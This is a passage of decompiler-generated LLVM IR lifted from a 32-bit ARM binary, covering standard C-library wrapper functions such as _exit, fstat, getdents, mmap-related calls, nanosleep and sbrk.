  store i32 %v1_154c8, i32* %r2.global-to-local, align 4
  %v3_154cc = add i32 %v4_154c4, %v0_154c0
  %v4_154cc = inttoptr i32 %v3_154cc to i32*
  store i32 %v1_154c8, i32* %v4_154cc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_154d4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_154d4

dec_label_pc_154d4:                               ; preds = %entry, %dec_label_pc_154bc
  %v1_154d8 = phi i32 [ %v0_154ac, %entry ], [ -1, %dec_label_pc_154bc ]
  %v2_154d4 = phi i32 [ %v3_154a0, %entry ], [ %v2_154d4.pre, %dec_label_pc_154bc ]
  store i32 %v2_154d4, i32* @r7, align 4
  ret i32 %v1_154d8

; uselistorder directives
  uselistorder i32 %v0_154ac, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_154d4, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_154ec

dec_label_pc_154ec:                               ; preds = %dec_label_pc_15518, %dec_label_pc_1552c, %entry
  %v0_154ec = phi i32 [ %arg1, %entry ], [ %v0_154ec.pre.pre, %dec_label_pc_1552c ], [ %v0_15518, %dec_label_pc_15518 ]
  store i32 %v0_154ec, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_154ec, -4095
  br i1 %tmp, label %dec_label_pc_15518, label %dec_label_pc_15508

dec_label_pc_15508:                               ; preds = %dec_label_pc_154ec
  %v0_15508 = call i32 @__aeabi_read_tp()
  %v0_1550c = load i32, i32* %r2.global-to-local, align 4
  %v1_1550c = sub i32 0, %v0_1550c
  store i32 %v1_1550c, i32* %r2.global-to-local, align 4
  %v3_15510 = load i16, i16* @global_var_2225c.361, align 2
  %v4_15510 = sext i16 %v3_15510 to i32
  %v3_15514 = add i32 %v4_15510, %v0_15508
  %v4_15514 = inttoptr i32 %v3_15514 to i32*
  store i32 %v1_1550c, i32* %v4_15514, align 4
  %v0_15518.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15518

dec_label_pc_15518:                               ; preds = %dec_label_pc_154ec, %dec_label_pc_15508
  %v0_15518 = phi i32 [ %v0_154ec, %dec_label_pc_154ec ], [ %v0_15518.pre, %dec_label_pc_15508 ]
  store i32 %v0_15518, i32* %r2.global-to-local, align 4
  %tmp4 = icmp ult i32 %v0_15518, -4095
  br i1 %tmp4, label %dec_label_pc_154ec, label %dec_label_pc_1552c

dec_label_pc_1552c:                               ; preds = %dec_label_pc_15518
  %v0_1552c = call i32 @__aeabi_read_tp()
  %v0_15530 = load i32, i32* %r2.global-to-local, align 4
  %v1_15530 = sub i32 0, %v0_15530
  store i32 %v1_15530, i32* %r2.global-to-local, align 4
  %v3_15534 = load i16, i16* @global_var_2225c.361, align 2
  %v4_15534 = sext i16 %v3_15534 to i32
  %v3_15538 = add i32 %v4_15534, %v0_1552c
  %v4_15538 = inttoptr i32 %v3_15538 to i32*
  store i32 %v1_15530, i32* %v4_15538, align 4
  %v0_154ec.pre.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_154ec

; uselistorder directives
  uselistorder i32 %v0_15518, { 0, 2, 1 }
  uselistorder i32 %v0_154ec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15518, { 1, 0 }
  uselistorder label %dec_label_pc_154ec, { 1, 0, 2 }
}

define i32 @fstat() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %v0_15550 = load i32, i32* @r1, align 4
  store i32 %v0_15550, i32* @r3, align 4
  store i32 197, i32* %r7.global-to-local, align 4
  %v0_15560 = load i32, i32* @r0, align 4
  store i32 %v0_15560, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_15560, -4095
  br i1 %tmp, label %dec_label_pc_15588, label %dec_label_pc_1556c

dec_label_pc_1556c:                               ; preds = %entry
  %v0_15570 = call i32 @__aeabi_read_tp()
  %v3_15574 = load i16, i16* @global_var_2225c.361, align 2
  %v4_15574 = sext i16 %v3_15574 to i32
  store i32 %v4_15574, i32* @r3, align 4
  %v0_15578 = load i32, i32* @r2, align 4
  %v1_15578 = sub i32 0, %v0_15578
  store i32 %v1_15578, i32* @r2, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v3_15580 = add i32 %v4_15574, %v0_15570
  %v4_15580 = inttoptr i32 %v3_15580 to i32*
  store i32 %v1_15578, i32* %v4_15580, align 4
  br label %dec_label_pc_15598

dec_label_pc_15588:                               ; preds = %entry
  store i32 %v0_15560, i32* %r7.global-to-local, align 4
  %v2_15588 = icmp eq i32 %v0_15560, 0
  br i1 %v2_15588, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_15588
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_15588, %bb
  call void @__pseudo_cond_branch(i1 %v2_15588, i32 ptrtoint (i32* @global_var_159d8.595 to i32))
  br label %dec_label_pc_15598

dec_label_pc_15598:                               ; preds = %dec_label_pc_1556c, %.thread
  %v0_15598 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_15598

; uselistorder directives
  uselistorder i32 %v0_15560, { 1, 2, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_15598, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__getdents(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %v6_155ac = load i32, i32* @r5, align 4
  %v18_155ac = load i32, i32* @sl, align 4
  store i32 141, i32* %r7.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_155e4, label %dec_label_pc_155c8

dec_label_pc_155c8:                               ; preds = %entry
  %v1_155cc = sub i32 0, %arg1
  %v3_155d0 = load i16, i16* @global_var_2225c.361, align 2
  %v4_155d0 = sext i16 %v3_155d0 to i32
  store i32 %v4_155d0, i32* %r3.global-to-local, align 4
  %v0_155d4 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* @r5, align 4
  %v3_155dc = add i32 %v4_155d0, %v0_155d4
  %v4_155dc = inttoptr i32 %v3_155dc to i32*
  store i32 %v1_155cc, i32* %v4_155dc, align 4
  br label %dec_label_pc_15638

dec_label_pc_155e4:                               ; preds = %entry
  br i1 false, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_155e4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  %v3_155ec = add i32 %arg2, %arg1
  store i32 %v3_155ec, i32* @sl, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_155e4, %bb
  %v1_156284 = phi i32 [ %v18_155ac, %dec_label_pc_155e4 ], [ %v3_155ec, %bb ]
  %v0_156242 = phi i32 [ 141, %dec_label_pc_155e4 ], [ %arg2, %bb ]
  br i1 false, label %dec_label_pc_15638, label %dec_label_pc_15624

dec_label_pc_155f8:                               ; preds = %dec_label_pc_15624
  %v1_1562c = inttoptr i32 %v1_15624 to i8*
  %v1_155f8 = add i32 %v0_155f8, 8
  %v2_155f8 = inttoptr i32 %v1_155f8 to i16*
  %v3_155f8 = load i16, i16* %v2_155f8, align 2
  %v4_155f8 = zext i16 %v3_155f8 to i32
  %v2_155fc = add i32 %v4_155f8, %v0_155f8
  store i32 %v2_155fc, i32* @r3, align 4
  %v1_15600 = add i32 %v2_155fc, -1
  %v2_15600 = inttoptr i32 %v1_15600 to i8*
  %v3_15600 = load i8, i8* %v2_15600, align 1
  %v4_15600 = zext i8 %v3_15600 to i32
  store i32 %v4_15600, i32* @r4, align 4
  %v3_15604 = call i32 @strlen(i8* %v1_1562c)
  %v0_15608 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_15608, i32* @r1, align 4
  %v1_1560c = add i32 %v3_15604, 1
  store i32 %v1_1560c, i32* @r2, align 4
  %v0_15610 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_15610, i32* @r0, align 4
  %v3_15614 = call i32 @memmove(i32 %v0_15610, i32 %v0_15608, i32 %v1_1560c)
  %v0_15618 = load i32, i32* %r7.global-to-local, align 4
  %v1_15618 = add i32 %v0_15618, 8
  %v2_15618 = inttoptr i32 %v1_15618 to i16*
  %v3_15618 = load i16, i16* %v2_15618, align 2
  %v4_15618 = zext i16 %v3_15618 to i32
  store i32 %v4_15618, i32* %r3.global-to-local, align 4
  %v0_1561c = load i32, i32* @r4, align 4
  %v1_1561c = trunc i32 %v0_1561c to i8
  %v3_1561c = add i32 %v0_15618, 10
  %v4_1561c = inttoptr i32 %v3_1561c to i8*
  store i8 %v1_1561c, i8* %v4_1561c, align 1
  %v0_15620 = load i32, i32* %r7.global-to-local, align 4
  %v1_15620 = load i32, i32* %r3.global-to-local, align 4
  %v2_15620 = add i32 %v1_15620, %v0_15620
  store i32 %v2_15620, i32* %r7.global-to-local, align 4
  %v1_15628.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_15624

dec_label_pc_15624:                               ; preds = %.thread, %dec_label_pc_155f8
  %v1_15628 = phi i32 [ %v1_15628.pre, %dec_label_pc_155f8 ], [ %v1_156284, %.thread ]
  %v0_155f8 = phi i32 [ %v2_15620, %dec_label_pc_155f8 ], [ %v0_156242, %.thread ]
  %v1_15624 = add i32 %v0_155f8, 10
  store i32 %v1_15624, i32* %r6.global-to-local, align 4
  %v3_15628 = icmp ult i32 %v0_155f8, %v1_15628
  %v1_15630 = add i32 %v0_155f8, 11
  store i32 %v1_15630, i32* %r8.global-to-local, align 4
  br i1 %v3_15628, label %dec_label_pc_155f8, label %dec_label_pc_15638

dec_label_pc_15638:                               ; preds = %dec_label_pc_15624, %.thread, %dec_label_pc_155c8
  %v0_15638 = load i32, i32* @r5, align 4
  store i32 %v6_155ac, i32* @r5, align 4
  store i32 %v18_155ac, i32* @sl, align 4
  ret i32 %v0_15638

; uselistorder directives
  uselistorder i32 %v1_15624, { 1, 0 }
  uselistorder i32 %v0_155f8, { 2, 4, 3, 1, 0 }
  uselistorder i32 %v18_155ac, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 3, 1, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_15624, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_15650 = ptrtoint i32* %stack_var_-16 to i32
  %v2_1565c = call i32 @getrlimit(i32 7, i32 %v2_15650)
  %v1_15660 = icmp slt i32 %v2_1565c, 0
  %v5_15664 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_15660, i32 256, i32 %v5_15664
  ret i32 %storemerge
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v1_15688 = load i32, i32* @r0, align 4
  ret i32 %v1_15688
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v1_1569c = load i32, i32* @r0, align 4
  ret i32 %v1_1569c
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %v1_156b0 = load i32, i32* @r0, align 4
  ret i32 %v1_156b0
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v4_156c0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 148) to i32*), align 4
  %v1_156c4 = inttoptr i32 %v4_156c0 to i32*
  %v2_156c4 = load i32, i32* %v1_156c4, align 4
  %v2_156c8 = icmp eq i32 %v2_156c4, 0
  br i1 %v2_156c8, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_156d0 = phi i32 [ %v2_156c4, %entry ], [ 4096, %bb ]
  ret i32 %v1_156d0

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_15708, label %dec_label_pc_156f0

dec_label_pc_156f0:                               ; preds = %entry
  %v1_156f4 = sub i32 0, %arg1
  %v3_156f8 = load i16, i16* @global_var_2225c.361, align 2
  %v4_156f8 = sext i16 %v3_156f8 to i32
  %v0_156fc = call i32 @__aeabi_read_tp()
  %v3_15700 = add i32 %v4_156f8, %v0_156fc
  %v4_15700 = inttoptr i32 %v3_15700 to i32*
  store i32 %v1_156f4, i32* %v4_15700, align 4
  br label %dec_label_pc_15708

dec_label_pc_15708:                               ; preds = %entry, %dec_label_pc_156f0
  %v1_1570c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_156f0 ]
  ret i32 %v1_1570c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15708, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15714 = load i32, i32* @r7, align 4
  store i32 %v3_15714, i32* %stack_var_-8, align 4
  %v0_15720 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15720, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_15720, -4095
  br i1 %tmp, label %dec_label_pc_15748, label %dec_label_pc_15730

dec_label_pc_15730:                               ; preds = %entry
  %v0_15734 = call i32 @__aeabi_read_tp()
  %v3_15738 = load i16, i16* @global_var_2225c.361, align 2
  %v4_15738 = sext i16 %v3_15738 to i32
  store i32 %v4_15738, i32* @r3, align 4
  %v0_1573c = load i32, i32* %r2.global-to-local, align 4
  %v1_1573c = sub i32 0, %v0_1573c
  store i32 %v1_1573c, i32* %r2.global-to-local, align 4
  %v3_15740 = add i32 %v4_15738, %v0_15734
  %v4_15740 = inttoptr i32 %v3_15740 to i32*
  store i32 %v1_1573c, i32* %v4_15740, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_15748.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15748

dec_label_pc_15748:                               ; preds = %entry, %dec_label_pc_15730
  %v1_1574c = phi i32 [ %v0_15720, %entry ], [ -1, %dec_label_pc_15730 ]
  %v2_15748 = phi i32 [ %v3_15714, %entry ], [ %v2_15748.pre, %dec_label_pc_15730 ]
  store i32 %v2_15748, i32* @r7, align 4
  ret i32 %v1_1574c

; uselistorder directives
  uselistorder i32 %v0_15720, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15748, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %v1_15764 = load i32, i32* @r0, align 4
  ret i32 %v1_15764
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_15768 = load i32, i32* @r4, align 4
  store i32 %v3_15768, i32* %stack_var_-12, align 4
  %v0_15778 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15778, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_15778, -4095
  br i1 %tmp, label %dec_label_pc_157a0, label %dec_label_pc_15788

dec_label_pc_15788:                               ; preds = %entry
  %v0_1578c = call i32 @__aeabi_read_tp()
  %v3_15790 = load i16, i16* @global_var_2225c.361, align 2
  %v4_15790 = sext i16 %v3_15790 to i32
  %v0_15794 = load i32, i32* %r2.global-to-local, align 4
  %v1_15794 = sub i32 0, %v0_15794
  store i32 %v1_15794, i32* %r2.global-to-local, align 4
  %v3_15798 = add i32 %v4_15790, %v0_1578c
  %v4_15798 = inttoptr i32 %v3_15798 to i32*
  store i32 %v1_15794, i32* %v4_15798, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_157a0.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_157a0

dec_label_pc_157a0:                               ; preds = %entry, %dec_label_pc_15788
  %v1_157a4 = phi i32 [ %v0_15778, %entry ], [ -1, %dec_label_pc_15788 ]
  %v2_157a0 = phi i32 [ %v3_15768, %entry ], [ %v2_157a0.pre, %dec_label_pc_15788 ]
  store i32 %v2_157a0, i32* @r4, align 4
  ret i32 %v1_157a4

; uselistorder directives
  uselistorder i32 %v0_15778, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_157a0, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_157ac = load i32, i32* @r7, align 4
  store i32 %v3_157ac, i32* %stack_var_-8, align 4
  %v0_157b8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_157b8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_157b8, -4095
  br i1 %tmp, label %dec_label_pc_157e0, label %dec_label_pc_157c8

dec_label_pc_157c8:                               ; preds = %entry
  %v0_157cc = call i32 @__aeabi_read_tp()
  %v3_157d0 = load i16, i16* @global_var_2225c.361, align 2
  %v4_157d0 = sext i16 %v3_157d0 to i32
  %v0_157d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_157d4 = sub i32 0, %v0_157d4
  store i32 %v1_157d4, i32* %r2.global-to-local, align 4
  %v3_157d8 = add i32 %v4_157d0, %v0_157cc
  %v4_157d8 = inttoptr i32 %v3_157d8 to i32*
  store i32 %v1_157d4, i32* %v4_157d8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_157e0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_157e0

dec_label_pc_157e0:                               ; preds = %entry, %dec_label_pc_157c8
  %v1_157e4 = phi i32 [ %v0_157b8, %entry ], [ -1, %dec_label_pc_157c8 ]
  %v2_157e0 = phi i32 [ %v3_157ac, %entry ], [ %v2_157e0.pre, %dec_label_pc_157c8 ]
  store i32 %v2_157e0, i32* @r7, align 4
  ret i32 %v1_157e4

; uselistorder directives
  uselistorder i32 %v0_157b8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_157e0, { 1, 0 }
}

define i32 @__syscall_nanosleep() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_157ec = load i32, i32* @r7, align 4
  store i32 %v3_157ec, i32* %stack_var_-8, align 4
  %v0_157f8 = load i32, i32* @r0, align 4
  store i32 %v0_157f8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_157f8, -4095
  br i1 %tmp, label %dec_label_pc_15820, label %dec_label_pc_15808

dec_label_pc_15808:                               ; preds = %entry
  %v0_1580c = call i32 @__aeabi_read_tp()
  %v3_15810 = load i16, i16* @global_var_2225c.361, align 2
  %v4_15810 = sext i16 %v3_15810 to i32
  %v0_15814 = load i32, i32* %r2.global-to-local, align 4
  %v1_15814 = sub i32 0, %v0_15814
  store i32 %v1_15814, i32* %r2.global-to-local, align 4
  %v3_15818 = add i32 %v4_15810, %v0_1580c
  %v4_15818 = inttoptr i32 %v3_15818 to i32*
  store i32 %v1_15814, i32* %v4_15818, align 4
  %v2_15820.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_15820

dec_label_pc_15820:                               ; preds = %entry, %dec_label_pc_15808
  %v1_15824 = phi i32 [ %v0_157f8, %entry ], [ -1, %dec_label_pc_15808 ]
  %v2_15820 = phi i32 [ %v3_157ec, %entry ], [ %v2_15820.pre, %dec_label_pc_15808 ]
  store i32 %v2_15820, i32* @r7, align 4
  ret i32 %v1_15824

; uselistorder directives
  uselistorder i32 %v0_157f8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_15820, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v4_15838 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 12824) to i32*), align 4
  %v2_1583c = icmp eq i32 %v4_15838, 0
  %v3_15840 = load i32, i32* @r4, align 4
  %v9_15840 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_1583c, label %dec_label_pc_15850, label %entry.dec_label_pc_15858_crit_edge

entry.dec_label_pc_15858_crit_edge:               ; preds = %entry
  br label %dec_label_pc_15858

dec_label_pc_15850:                               ; preds = %entry
  store i32 %v3_15840, i32* @r4, align 4
  store i32 %v9_15840, i32* @r6, align 4
  %v0_15854 = call i32 @__syscall_nanosleep()
  br label %dec_label_pc_15858

dec_label_pc_15858:                               ; preds = %entry.dec_label_pc_15858_crit_edge, %dec_label_pc_15850
  %v0_15858 = call i32 @__libc_enable_asynccancel()
  %v0_1585c = load i32, i32* @r6, align 4
  store i32 %v0_1585c, i32* @r1, align 4
  store i32 %v0_15858, i32* @r5, align 4
  %v0_15864 = load i32, i32* @r4, align 4
  store i32 %v0_15864, i32* @r0, align 4
  %v0_15868 = call i32 @__syscall_nanosleep()
  store i32 %v0_15868, i32* @r4, align 4
  %v0_15870 = load i32, i32* @r5, align 4
  %v1_15874 = call i32 @__libc_disable_asynccancel(i32 %v0_15870)
  %v0_15878 = load i32, i32* @r4, align 4
  ret i32 %v0_15878

; uselistorder directives
  uselistorder i32 (i32)* @__libc_disable_asynccancel, { 3, 8, 13, 1, 5, 4, 6, 7, 12, 2, 11, 10, 9, 0 }
  uselistorder i32 ()* @__libc_enable_asynccancel, { 3, 8, 13, 1, 5, 4, 6, 7, 12, 2, 11, 10, 9, 0 }
  uselistorder label %dec_label_pc_15858, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1588c = load i32, i32* @r4, align 4
  store i32 %v3_1588c, i32* %stack_var_-16, align 4
  store i32 11576, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %r4.global-to-local, align 4
  %v4_1589c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 11576) to i32*), align 4
  %v2_158a0 = icmp eq i32 %v4_1589c, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_158a0, label %dec_label_pc_158ac, label %dec_label_pc_158bc

dec_label_pc_158ac:                               ; preds = %entry
  %v1_158b0 = call i32 @__GI_brk(i32 0)
  %v1_158b4 = icmp slt i32 %v1_158b0, 0
  br i1 %v1_158b4, label %dec_label_pc_158e0, label %dec_label_pc_158bcthread-pre-split

dec_label_pc_158bcthread-pre-split:               ; preds = %dec_label_pc_158ac
  %v0_158c0.pr = load i32, i32* %r5.global-to-local, align 4
  %v0_158bc.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_158bc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_158bc

dec_label_pc_158bc:                               ; preds = %dec_label_pc_158bcthread-pre-split, %entry
  %v1_158bc = phi i32 [ %v1_158bc.pre, %dec_label_pc_158bcthread-pre-split ], [ 11576, %entry ]
  %v0_158bc = phi i32 [ %v0_158bc.pre, %dec_label_pc_158bcthread-pre-split ], [ ptrtoint (i32* @global_var_22204.365 to i32), %entry ]
  %v1_158d0 = phi i32 [ %v0_158c0.pr, %dec_label_pc_158bcthread-pre-split ], [ %arg1, %entry ]
  %v2_158bc = add i32 %v0_158bc, %v1_158bc
  %v3_158bc = inttoptr i32 %v2_158bc to i32*
  %v4_158bc = load i32, i32* %v3_158bc, align 4
  %v2_158c0 = icmp eq i32 %v1_158d0, 0
  store i32 %v4_158bc, i32* %r4.global-to-local, align 4
  br i1 %v2_158c0, label %dec_label_pc_158e4, label %dec_label_pc_158cc

dec_label_pc_158cc:                               ; preds = %dec_label_pc_158bc
  %v2_158d0 = add i32 %v4_158bc, %v1_158d0
  %v1_158d4 = call i32 @__GI_brk(i32 %v2_158d0)
  %v1_158d8 = icmp slt i32 %v1_158d4, 0
  br i1 %v1_158d8, label %dec_label_pc_158e0, label %dec_label_pc_158cc.dec_label_pc_158e4_crit_edge

dec_label_pc_158cc.dec_label_pc_158e4_crit_edge:  ; preds = %dec_label_pc_158cc
  %v0_158e4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_158e4

dec_label_pc_158e0:                               ; preds = %dec_label_pc_158cc, %dec_label_pc_158ac
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_158e4

dec_label_pc_158e4:                               ; preds = %dec_label_pc_158bc, %dec_label_pc_158cc.dec_label_pc_158e4_crit_edge, %dec_label_pc_158e0
  %v0_158e4 = phi i32 [ %v0_158e4.pre, %dec_label_pc_158cc.dec_label_pc_158e4_crit_edge ], [ -1, %dec_label_pc_158e0 ], [ %v4_158bc, %dec_label_pc_158bc ]
  %v2_158e8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_158e8, i32* @r4, align 4
  ret i32 %v0_158e4

; uselistorder directives
  uselistorder i32 %v4_158bc, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_158e4, { 2, 1, 0 }
}

define i32 @times(i32 %arg1) local_unnamed_addr {
entry:
  %v1_15908 = load i32, i32* @r0, align 4
  ret i32 %v1_15908
}

define i32 @__xstat64_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_1590c = load i32, i32* @r4, align 4
  store i32 %v3_1590c, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* %r2.global-to-local, align 4
  %v3_15924 = inttoptr i32 %arg2 to i8*
  %v4_15924 = call i32 @__GI_memset(i8* %v3_15924, i32 0, i32 104)
  %v2_15928 = load i32, i32* %arg1, align 4
  store i32 %v2_15928, i32* %r3.global-to-local, align 4
  %v3_15928 = add i32 %tmp, 4
  %v4_15928 = inttoptr i32 %v3_15928 to i32*
  %v5_15928 = load i32, i32* %v4_15928, align 4
  store i32 %v5_15928, i32* %r4.global-to-local, align 4
  %v0_1592c = load i32, i32* %r5.global-to-local, align 4
  %v1_1592c = inttoptr i32 %v0_1592c to i32*
  store i32 %v2_15928, i32* %v1_1592c, align 4
  %v3_1592c = add i32 %v0_1592c, 4
  %v4_1592c = inttoptr i32 %v3_1592c to i32*
  %v5_1592c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1592c, i32* %v4_1592c, align 4
  %v0_15930 = load i32, i32* %r6.global-to-local, align 4
  %v1_15930 = add i32 %v0_15930, 12
  %v2_15930 = inttoptr i32 %v1_15930 to i32*
  %v3_15930 = load i32, i32* %v2_15930, align 4
  %v1_15934 = load i32, i32* %r5.global-to-local, align 4
  %v2_15934 = add i32 %v1_15934, 12
  %v3_15934 = inttoptr i32 %v2_15934 to i32*
  store i32 %v3_15930, i32* %v3_15934, align 4
  %v0_15938 = load i32, i32* %r6.global-to-local, align 4
  %v1_15938 = add i32 %v0_15938, 96
  store i32 %v1_15938, i32* %r3.global-to-local, align 4
  %v1_1593c = inttoptr i32 %v1_15938 to i32*
  %v2_1593c = load i32, i32* %v1_1593c, align 4
  store i32 %v2_1593c, i32* %r3.global-to-local, align 4
  %v3_1593c = add i32 %v0_15938, 100
  %v4_1593c = inttoptr i32 %v3_1593c to i32*
  %v5_1593c = load i32, i32* %v4_1593c, align 4
  store i32 %v5_1593c, i32* %r4.global-to-local, align 4
  %v1_15940 = add i32 %v0_15938, 56
  %v2_15940 = inttoptr i32 %v1_15940 to i32*
  %v3_15940 = load i32, i32* %v2_15940, align 4
  store i32 %v3_15940, i32* %r2.global-to-local, align 4
  %v1_15944 = load i32, i32* %r5.global-to-local, align 4
  %v2_15944 = add i32 %v1_15944, 96
  %v3_15944 = inttoptr i32 %v2_15944 to i32*
  store i32 %v2_1593c, i32* %v3_15944, align 4
  %v0_15948 = load i32, i32* %r4.global-to-local, align 4
  %v1_15948 = load i32, i32* %r5.global-to-local, align 4
